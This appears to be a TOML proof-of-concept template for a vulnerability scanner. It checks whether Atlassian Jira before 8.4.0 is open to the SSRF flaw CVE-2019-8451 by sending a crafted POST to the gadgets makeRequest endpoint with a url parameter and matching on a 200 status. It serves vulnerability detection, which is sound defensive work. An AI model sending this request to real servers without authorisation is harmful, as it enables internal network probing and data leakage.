[info]
author = "ave"
description = "验证 Atlassian Jira 8.4.0 之前版本是否存在 SSRF 漏洞，通过 /plugins/servlet/gadgets/makeRequest 端点发送 POST 请求，利用 JiraWhitelist 类的逻辑缺陷访问内网资源。攻击者可构造恶意 URL 参数使 Jira 服务器向任意地址发起请求，导致信息泄露或内网探测。"
id = "POC-AVE-2019-0203"
name = "Atlassian Jira < 8.4.0 SSRF PoC"
severity = "medium"
tags = ["ave-2019-0203"]
vuln_id = [
    "CVE-2019-8451",
    "AVE-2019-0203",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/plugins/servlet/gadgets/makeRequest"
protocol = "http"

[poc.requests.body]
content = "url=https://{{Hostname}}:443"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
X-Atlassian-Token = "no-check"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
